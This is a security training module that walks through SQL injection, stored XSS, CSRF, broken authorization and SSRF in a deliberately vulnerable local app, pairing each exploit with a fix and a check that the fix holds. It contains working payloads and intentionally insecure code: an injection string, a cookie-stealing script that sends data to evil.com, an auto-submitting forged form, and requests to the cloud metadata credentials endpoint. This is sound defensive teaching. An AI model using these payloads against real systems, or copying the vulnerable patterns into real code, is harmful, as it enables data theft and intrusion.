# L1-M23: OWASP Top 10 -- Finding Vulnerabilities

> **Loop 1 (Foundation)** | Section 1E: Security & Reliability Basics | ⏱️ 75 min | 🟢 Core | Prerequisites: L1-M13 (Authentication & Authorization)
>
> **Source:** Chapters 5, 4, 20 of the 100x Engineer Guide

---

## The Goal

TicketPulse has security holes. Real ones. They were planted on purpose so you can experience what an attacker sees before you learn to defend against it.

This module follows a strict loop for each vulnerability: **see the attack, understand why it works, implement the fix, verify the fix holds.** You will run actual exploits against your local TicketPulse instance. Nothing leaves your machine.

By the end, you will have hands-on experience with the five most common web vulnerabilities and the patterns that prevent them.

**You will exploit your first vulnerability within the first three minutes.**

---

## 0. Quick Start (3 minutes)

Make sure TicketPulse is running:

```bash
cd ticketpulse
docker compose up -d
```

Verify the app is responding:

```bash
curl -s http://localhost:3000/api/health | jq .
# Expected: { "status": "ok" }
```

Seed some data if you have not already:

```bash
curl -s -X POST http://localhost:3000/api/seed | jq .
```

Good. Now let us break things.

---

## 1. SQL Injection: The Search Endpoint

### 1.1 The Vulnerable Code

TicketPulse has a search endpoint that lets users find events by name. Open the search route:

```typescript
// src/routes/search.ts -- THE VULNERABLE VERSION (do not deploy this)

router.get('/api/search', async (req, res) => {
  const { q } = req.query;

  // VULNERABLE: user input is concatenated directly into SQL
  const result = await pool.query(
    `SELECT * FROM events WHERE title ILIKE '%${q}%'`
  );

  res.json({ data: result.rows });
});
```

The problem: the user's search term (`q`) is pasted directly into the SQL string. Whatever the user types becomes part of the SQL command.

### 1.2 Exploit It

Try a normal search first:

```bash
curl -s "http://localhost:3000/api/search?q=concert" | jq '.data | length'
# Returns: some number of events with "concert" in the title
```

Now inject SQL:

```bash
# This closes the ILIKE string and adds OR 1=1 which is always true
curl -s "http://localhost:3000/api/search?q=' OR 1=1 --" | jq '.data | length'
```

That should return ALL events in the database, regardless of the search term. The SQL that executed was:

```sql
SELECT * FROM events WHERE title ILIKE '%' OR 1=1 --%'
```

The `--` is a SQL comment, so everything after it is ignored. `OR 1=1` is always true. The attacker just dumped your entire events table.

It gets worse. Try this:

```bash
# Extract the database version
curl -s "http://localhost:3000/api/search?q=' UNION SELECT 1,version(),3,4,5,6,7 --" | jq .
```

If the column count matches, the attacker can now extract arbitrary data from your database -- user emails, hashed passwords, anything.

> **Reflect:** Imagine this is your production database. The attacker can now read every table. How would you even know this happened if you were not watching the logs?

### 1.3 Fix It: Parameterized Queries

The fix is simple and absolute: **never concatenate user input into SQL.** Use parameterized queries instead.

```typescript
// src/routes/search.ts -- THE FIXED VERSION

router.get('/api/search', async (req, res) => {
  const { q } = req.query;

  if (typeof q !== 'string' || q.length === 0) {
    return res.status(400).json({
      error: { code: 'INVALID_QUERY', message: 'Search query is required' },
    });
  }

  if (q.length > 200) {
    return res.status(400).json({
      error: { code: 'QUERY_TOO_LONG', message: 'Search query must be under 200 characters' },
    });
  }

  // SAFE: $1 is a parameter placeholder. The database treats it as data, never as SQL.
  const result = await pool.query(
    'SELECT * FROM events WHERE title ILIKE $1',
    [`%${q}%`]
  );

  res.json({ data: result.rows });
});
```

The key difference: `$1` is a **parameter placeholder**. The database driver sends the SQL query and the parameter value separately. The database engine parses the SQL first, then binds the parameter. The user's input can never be interpreted as SQL -- it is always treated as a string value.

### 1.4 Verify the Fix

Restart the server with the fix applied, then try the exploit again:

```bash
curl -s "http://localhost:3000/api/search?q=' OR 1=1 --" | jq '.data | length'
# Expected: 0 (no events have "' OR 1=1 --" in their title)
```

The injection attempt is now treated as a literal search string. The SQL that executes is:

```sql
SELECT * FROM events WHERE title ILIKE '%'' OR 1=1 --%'
```

The single quote is escaped. The attacker's payload is just a weird search term now.

### 1.5 The Rule

**Every database query that includes user input must use parameterized queries.** There are no exceptions. Not "most of the time." Not "when it seems risky." Every time. Always.

If your ORM generates queries for you (Prisma, Drizzle, TypeORM), you are usually safe. But raw queries always need parameters.

---

## 2. XSS: User Reviews Without Escaping

### 2.1 The Vulnerable Code

TicketPulse has a review feature. Users can leave reviews on events, and those reviews are displayed to other users. The problem: the reviews are rendered without escaping.

```typescript
// src/routes/reviews.ts -- THE VULNERABLE VERSION

router.post('/api/events/:eventId/reviews', async (req, res) => {
  const { eventId } = req.params;
  const { userId, content, rating } = req.body;

  // Stores whatever the user typed -- including HTML/JavaScript
  const result = await pool.query(
    'INSERT INTO reviews (event_id, user_id, content, rating) VALUES ($1, $2, $3, $4) RETURNING *',
    [eventId, userId, content, rating]
  );

  res.status(201).json({ data: result.rows[0] });
});

router.get('/api/events/:eventId/reviews', async (req, res) => {
  const { eventId } = req.params;
  const result = await pool.query(
    'SELECT * FROM reviews WHERE event_id = $1 ORDER BY created_at DESC',
    [eventId]
  );

  res.json({ data: result.rows });
});
```

```html
<!-- Imagine a frontend template rendering this review -->
<div class="review">
  <p class="review-content">${review.content}</p>
</div>
```

Notice: the SQL is parameterized (good), but the review content is stored as-is and rendered without escaping (bad).

### 2.2 Exploit It

Submit a review with embedded JavaScript:

```bash
curl -s -X POST http://localhost:3000/api/events/1/reviews \
  -H "Content-Type: application/json" \
  -d '{
    "userId": 1,
    "content": "<script>document.location=\"http://evil.com/steal?cookie=\"+document.cookie</script>",
    "rating": 5
  }' | jq .
```

Now fetch the reviews:

```bash
curl -s http://localhost:3000/api/events/1/reviews | jq '.data[0].content'
# Returns: "<script>document.location=\"http://evil.com/steal?cookie=\"+document.cookie</script>"
```

If this content is rendered in a browser without escaping, the script executes. Every user viewing this event's reviews would have their cookies stolen and sent to the attacker's server.

This is **Stored XSS** -- the most dangerous kind because the malicious script is saved in the database and served to every subsequent visitor.

### 2.3 Fix It: Sanitize on Input, Escape on Output

Install a sanitization library:

```bash
npm install dompurify jsdom
npm install -D @types/dompurify
```

```typescript
// src/utils/sanitize.ts

import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window as any);

/**
 * Sanitize user input: strip ALL HTML tags and attributes.
 * For plain text fields (reviews, comments), we want zero HTML.
 */
export function sanitizeText(input: string): string {
  // ALLOWED_TAGS: [] means strip ALL tags
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] });
}

/**
 * Escape HTML entities for safe rendering in HTML context.
 * This is the output-side defense.
 */
export function escapeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

Update the review route to sanitize on input:

```typescript
// src/routes/reviews.ts -- THE FIXED VERSION

import { sanitizeText } from '../utils/sanitize';

router.post('/api/events/:eventId/reviews', async (req, res) => {
  const { eventId } = req.params;
  const { userId, content, rating } = req.body;

  // Sanitize: strip all HTML from the review content
  const sanitizedContent = sanitizeText(content);

  if (sanitizedContent.trim().length === 0) {
    return res.status(400).json({
      error: { code: 'EMPTY_REVIEW', message: 'Review content cannot be empty' },
    });
  }

  if (sanitizedContent.length > 2000) {
    return res.status(400).json({
      error: { code: 'REVIEW_TOO_LONG', message: 'Review must be under 2000 characters' },
    });
  }

  const result = await pool.query(
    'INSERT INTO reviews (event_id, user_id, content, rating) VALUES ($1, $2, $3, $4) RETURNING *',
    [eventId, userId, sanitizedContent, rating]
  );

  res.status(201).json({ data: result.rows[0] });
});
```

Additionally, set the Content-Security-Policy header to prevent inline script execution even if something slips through:

```typescript
// src/middleware/security-headers.ts

export function securityHeaders(req: Request, res: Response, next: NextFunction) {
  // Prevent inline scripts from executing
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Enable XSS filter in older browsers
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
}
```

### 2.4 Verify the Fix

```bash
curl -s -X POST http://localhost:3000/api/events/1/reviews \
  -H "Content-Type: application/json" \
  -d '{
    "userId": 1,
    "content": "<script>alert(\"xss\")</script>Great show!",
    "rating": 5
  }' | jq '.data.content'
# Expected: "Great show!" (script tags stripped)
```

The script tag is gone. The sanitizer kept the text, removed the HTML.

---

## 3. CSRF: Unprotected Purchase Endpoint

### 3.1 The Attack

CSRF (Cross-Site Request Forgery) tricks a user's browser into making a request they did not intend. If a user is logged into TicketPulse and visits a malicious website, that website can trigger a ticket purchase on their behalf.

The attack works because browsers automatically send cookies (including session/auth cookies) with every request to a domain, regardless of which website initiated the request.

Here is what an attacker's website might look like:

```html
<!-- evil-site.html -- hosted on attacker's domain -->
<h1>Win Free Concert Tickets!</h1>
<p>Click the button below to claim your prize:</p>

<!-- Hidden form that submits to TicketPulse -->
<form action="http://localhost:3000/api/events/1/tickets" method="POST" id="csrf-form">
  <input type="hidden" name="quantity" value="10" />
</form>

<script>
  // Auto-submit the form when the page loads
  document.getElementById('csrf-form').submit();
</script>
```

If the user is logged into TicketPulse and visits this page, their browser sends the purchase request with their auth cookie attached. TicketPulse sees a valid session and processes the purchase. The user just bought 10 tickets without knowing it.

### 3.2 The Current (Vulnerable) State

```typescript
// src/routes/tickets.ts -- no CSRF protection

router.post('/api/events/:eventId/tickets', authenticate, async (req, res) => {
  // authenticate checks the JWT, but there's no CSRF token validation
  const { eventId } = req.params;
  const { quantity } = req.body;

  // ... processes the purchase
});
```

### 3.3 Fix It: CSRF Tokens

Install the CSRF protection library:

```bash
npm install csrf-csrf
```

```typescript
// src/middleware/csrf.ts

import { doubleCsrf } from 'csrf-csrf';

const {
  generateToken,
  doubleCsrfProtection,
} = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET || 'csrf-secret-change-me',
  cookieName: '__csrf',
  cookieOptions: {
    httpOnly: true,
    sameSite: 'strict',
    secure: process.env.NODE_ENV === 'production',
    path: '/',
  },
  getTokenFromRequest: (req) => req.headers['x-csrf-token'] as string,
});

export { generateToken, doubleCsrfProtection };
```

```typescript
// src/routes/csrf.ts -- endpoint to get a CSRF token

import { generateToken } from '../middleware/csrf';

router.get('/api/csrf-token', authenticate, (req, res) => {
  const token = generateToken(req, res);
  res.json({ csrfToken: token });
});
```

Apply the CSRF middleware to state-changing routes:

```typescript
// src/routes/tickets.ts -- FIXED with CSRF protection

import { doubleCsrfProtection } from '../middleware/csrf';

router.post(
  '/api/events/:eventId/tickets',
  authenticate,
  doubleCsrfProtection,  // Validates CSRF token before processing
  async (req, res) => {
    const { eventId } = req.params;
    const { quantity } = req.body;
    // ... processes the purchase (now CSRF-protected)
  }
);
```

### 3.4 How the Fix Works

1. The client calls `GET /api/csrf-token` to get a token.
2. The server sets a `__csrf` cookie AND returns the token in the response body.
3. The client sends the token in the `x-csrf-token` header on every state-changing request.
4. The server compares the header token to the cookie token. If they match, the request is legitimate.

Why this stops CSRF: the attacker's website can trigger a request that includes the cookie (browsers do that automatically), but it **cannot read the cookie value** (same-origin policy) and therefore cannot set the `x-csrf-token` header. The tokens will not match, and the request is rejected.

### 3.5 Verify the Fix

```bash
# Without CSRF token: should be rejected
curl -s -X POST http://localhost:3000/api/events/1/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 1}' | jq .
# Expected: 403 Forbidden -- "Invalid CSRF token"

# With CSRF token: should succeed
CSRF=$(curl -s -c cookies.txt http://localhost:3000/api/csrf-token \
  -H "Authorization: Bearer $TOKEN" | jq -r '.csrfToken')

curl -s -X POST http://localhost:3000/api/events/1/tickets \
  -b cookies.txt \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-csrf-token: $CSRF" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 1}' | jq .
# Expected: 201 Created
```

> **Note:** For pure API servers consumed by non-browser clients (mobile apps, other services), CSRF is less of a concern because those clients do not automatically send cookies. But if your API is consumed by a browser-based SPA with cookie-based auth, you need CSRF protection.

---

## 4. Broken Auth: The Admin Endpoint

### 4.1 The Vulnerable Code

TicketPulse has an admin endpoint for creating events. The `authenticate` middleware checks if a JWT exists and is valid, but it does **not** check the user's role:

```typescript
// src/middleware/authenticate.ts -- THE VULNERABLE VERSION

export async function authenticate(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: { code: 'UNAUTHORIZED', message: 'No token provided' } });
  }

  try {
    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JwtPayload;
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: { code: 'UNAUTHORIZED', message: 'Invalid token' } });
  }
}
```

```typescript
// src/routes/events.ts -- admin route uses only authenticate

router.post('/api/events', authenticate, async (req, res) => {
  // BUG: any authenticated user can create events, not just admins
  // ...
});

router.delete('/api/events/:id', authenticate, async (req, res) => {
  // BUG: any authenticated user can delete events
  // ...
});
```

### 4.2 Exploit It

Create a regular (non-admin) user and try to create an event:

```bash
# Sign up as a regular user
curl -s -X POST http://localhost:3000/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"email": "regular@example.com", "password": "password123", "name": "Regular User"}' | jq .

# Login to get a token
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "regular@example.com", "password": "password123"}' | jq -r '.data.token')

# Try to create an event as a non-admin user
curl -s -X POST http://localhost:3000/api/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Unauthorized Event",
    "venue": "Hacker Hall",
    "date": "2026-12-01T20:00:00Z",
    "totalTickets": 100,
    "priceInCents": 5000
  }' | jq .status
# Returns: 201 -- THIS SHOULD NOT WORK
```

A regular user just created an event. The authentication check passed (the JWT is valid), but there was no authorization check (the user is not an admin).

### 4.3 Fix It: Role-Based Authorization Middleware

```typescript
// src/middleware/authorize.ts

export function authorize(...allowedRoles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    // req.user was set by the authenticate middleware
    if (!req.user) {
      return res.status(401).json({
        error: { code: 'UNAUTHORIZED', message: 'Not authenticated' },
      });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        error: {
          code: 'FORBIDDEN',
          message: `This action requires one of: ${allowedRoles.join(', ')}`,
        },
      });
    }

    next();
  };
}
```

Apply it to admin routes:

```typescript
// src/routes/events.ts -- FIXED with role-based authorization

import { authorize } from '../middleware/authorize';

// Only admins can create events
router.post('/api/events', authenticate, authorize('admin'), async (req, res) => {
  // ...
});

// Only admins can delete events
router.delete('/api/events/:id', authenticate, authorize('admin'), async (req, res) => {
  // ...
});

// Anyone authenticated can read events
router.get('/api/events', authenticate, async (req, res) => {
  // ...
});
```

### 4.4 Verify the Fix

```bash
# Regular user: should be blocked
curl -s -X POST http://localhost:3000/api/events \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Unauthorized Event",
    "venue": "Hacker Hall",
    "date": "2026-12-01T20:00:00Z",
    "totalTickets": 100,
    "priceInCents": 5000
  }' | jq .
# Expected: 403 Forbidden -- "This action requires one of: admin"

# Admin user: should succeed
ADMIN_TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@ticketpulse.com", "password": "admin123"}' | jq -r '.data.token')

curl -s -X POST http://localhost:3000/api/events \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Authorized Event",
    "venue": "Real Venue",
    "date": "2026-12-01T20:00:00Z",
    "totalTickets": 100,
    "priceInCents": 5000
  }' | jq .status
# Expected: 201 Created
```

The principle: **authentication is not authorization.** Knowing who someone is (authentication) does not tell you what they are allowed to do (authorization). Always check both.

---

## 5. SSRF: The Image Proxy

### 5.1 The Vulnerable Code

TicketPulse has an image proxy endpoint that fetches event poster images from external URLs. This is common -- you do not want the client's browser making cross-origin requests, so the server fetches the image on their behalf.

```typescript
// src/routes/image-proxy.ts -- THE VULNERABLE VERSION

router.get('/api/image-proxy', authenticate, async (req, res) => {
  const { url } = req.query;

  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: { code: 'MISSING_URL', message: 'url parameter required' } });
  }

  try {
    // VULNERABLE: fetches any URL the user provides, including internal services
    const response = await fetch(url);
    const contentType = response.headers.get('content-type');

    res.setHeader('Content-Type', contentType || 'application/octet-stream');
    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));
  } catch (err) {
    res.status(502).json({ error: { code: 'FETCH_FAILED', message: 'Failed to fetch image' } });
  }
});
```

### 5.2 Exploit It

The intended use is fetching poster images:

```bash
curl -s "http://localhost:3000/api/image-proxy?url=https://example.com/poster.jpg" \
  -H "Authorization: Bearer $TOKEN" -o poster.jpg
```

But an attacker can point it at internal services:

```bash
# Hit the cloud metadata service (AWS EC2 instance metadata)
curl -s "http://localhost:3000/api/image-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "Authorization: Bearer $TOKEN"
# On AWS, this returns the instance's IAM credentials!

# Hit internal services
curl -s "http://localhost:3000/api/image-proxy?url=http://localhost:5432" \
  -H "Authorization: Bearer $TOKEN"
# Could probe internal database ports

# Hit internal admin panels
curl -s "http://localhost:3000/api/image-proxy?url=http://internal-admin.service:8080/api/users" \
  -H "Authorization: Bearer $TOKEN"
# Could access internal APIs not exposed to the internet
```

This is SSRF -- the attacker is using your server as a proxy to reach things they should not be able to reach. Your server is inside the network; the attacker is outside. The attacker just bypassed your firewall.

### 5.3 Fix It: URL Allowlisting

```typescript
// src/utils/url-validator.ts

import { URL } from 'url';
import dns from 'dns/promises';
import net from 'net';

// Only allow fetching from these domains
const ALLOWED_DOMAINS = [
  'images.ticketpulse.com',
  'cdn.ticketpulse.com',
  'img.example.com',
];

// Block these IP ranges (internal networks)
const BLOCKED_IP_RANGES = [
  '127.0.0.0/8',       // Loopback
  '10.0.0.0/8',        // Private (Class A)
  '172.16.0.0/12',     // Private (Class B)
  '192.168.0.0/16',    // Private (Class C)
  '169.254.0.0/16',    // Link-local (AWS metadata)
  '0.0.0.0/8',         // "This" network
  'fc00::/7',          // IPv6 unique local
  '::1/128',           // IPv6 loopback
];

function isPrivateIp(ip: string): boolean {
  // Check if the resolved IP falls in a blocked range
  if (net.isIPv4(ip)) {
    const parts = ip.split('.').map(Number);

    if (parts[0] === 127) return true;                                // 127.x.x.x
    if (parts[0] === 10) return true;                                 // 10.x.x.x
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;  // 172.16-31.x.x
    if (parts[0] === 192 && parts[1] === 168) return true;           // 192.168.x.x
    if (parts[0] === 169 && parts[1] === 254) return true;           // 169.254.x.x
    if (parts[0] === 0) return true;                                  // 0.x.x.x
  }

  return false;
}

export async function validateExternalUrl(rawUrl: string): Promise<URL> {
  let parsed: URL;

  try {
    parsed = new URL(rawUrl);
  } catch {
    throw new Error('Invalid URL');
  }

  // Only allow HTTPS
  if (parsed.protocol !== 'https:') {
    throw new Error('Only HTTPS URLs are allowed');
  }

  // Check against domain allowlist
  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    throw new Error(`Domain not allowed: ${parsed.hostname}`);
  }

  // Resolve the hostname and check the IP is not internal
  const addresses = await dns.resolve4(parsed.hostname);
  for (const ip of addresses) {
    if (isPrivateIp(ip)) {
      throw new Error('URL resolves to a private IP address');
    }
  }

  return parsed;
}
```

Update the proxy:

```typescript
// src/routes/image-proxy.ts -- THE FIXED VERSION

import { validateExternalUrl } from '../utils/url-validator';

router.get('/api/image-proxy', authenticate, async (req, res) => {
  const { url } = req.query;

  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: { code: 'MISSING_URL', message: 'url parameter required' } });
  }

  try {
    // Validate the URL before fetching
    const validatedUrl = await validateExternalUrl(url);

    const response = await fetch(validatedUrl.toString());
    const contentType = response.headers.get('content-type');

    // Only allow image content types
    if (!contentType || !contentType.startsWith('image/')) {
      return res.status(400).json({
        error: { code: 'NOT_IMAGE', message: 'URL does not point to an image' },
      });
    }

    res.setHeader('Content-Type', contentType);
    const buffer = await response.arrayBuffer();
    res.send(Buffer.from(buffer));
  } catch (err) {
    const message = err instanceof Error ? err.message : 'Failed to fetch image';
    res.status(400).json({ error: { code: 'INVALID_URL', message } });
  }
});
```

### 5.4 Verify the Fix

```bash
# Internal URL: blocked
curl -s "http://localhost:3000/api/image-proxy?url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer $TOKEN" | jq .
# Expected: 400 -- "Only HTTPS URLs are allowed"

# Non-allowlisted domain: blocked
curl -s "http://localhost:3000/api/image-proxy?url=https://evil.com/steal-data" \
  -H "Authorization: Bearer $TOKEN" | jq .
# Expected: 400 -- "Domain not allowed: evil.com"

# Valid image from allowed domain: works
curl -s "http://localhost:3000/api/image-proxy?url=https://images.ticketpulse.com/poster.jpg" \
  -H "Authorization: Bearer $TOKEN" -o poster.jpg
# Expected: image file saved
```

The defense is layered:
1. Protocol check (HTTPS only)
2. Domain allowlist (only approved CDN domains)
3. DNS resolution check (block private IPs even if the domain resolves to one)
4. Content-type validation (only serve actual images)

---

## 6. Summary: The Five Vulnerability Patterns

| Vulnerability | Attack Vector | The Fix | Rule |
|---|---|---|---|
| **SQL Injection** | User input in SQL | Parameterized queries | Never concatenate input into SQL |
| **XSS** | User content with HTML/JS | Sanitize input, escape output, CSP headers | Never render untrusted content as HTML |
| **CSRF** | Cross-site form submission | CSRF tokens + SameSite cookies | State-changing requests need CSRF protection |
| **Broken Auth** | Missing role checks | Authorization middleware per route | Authentication is not authorization |
| **SSRF** | Server fetches attacker-controlled URL | URL allowlisting + IP validation | Never let users control where your server makes requests |

---

## 7. Checkpoint

Before continuing to the next module, verify:

- [ ] You exploited the SQL injection and saw it return all events
- [ ] You submitted a script tag as a review and saw it stored unescaped
- [ ] You understand why CSRF works (browser sends cookies automatically)
- [ ] You tested that a regular user could create events (broken auth) and then could not after the fix
- [ ] You understand the SSRF attack path to cloud metadata endpoints
- [ ] All five vulnerabilities are fixed and verified in your TicketPulse instance

> **Reflect:** These five vulnerabilities represent the vast majority of web security issues in production applications. If you prevent these five, you are ahead of most teams. Security is not about being paranoid -- it is about knowing the common attack patterns and having a systematic defense for each one.

---

## What's Next

TicketPulse has `DB_PASSWORD=tiger123` hardcoded in the source code. In the next module, you will extract all secrets to environment variables, validate them on startup, and learn why this matters more than most engineers realize.

## Key Terms

| Term | Definition |
|------|-----------|
| **SQL injection** | An attack that inserts malicious SQL into a query, potentially reading or modifying database data. |
| **XSS** | Cross-Site Scripting; an attack that injects malicious scripts into web pages viewed by other users. |
| **CSRF** | Cross-Site Request Forgery; an attack that tricks a user's browser into making unwanted requests to a site where they are authenticated. |
| **SSRF** | Server-Side Request Forgery; an attack that causes a server to make requests to unintended internal or external resources. |
| **Parameterized query** | A query that uses placeholders for user input, preventing SQL injection by separating code from data. |
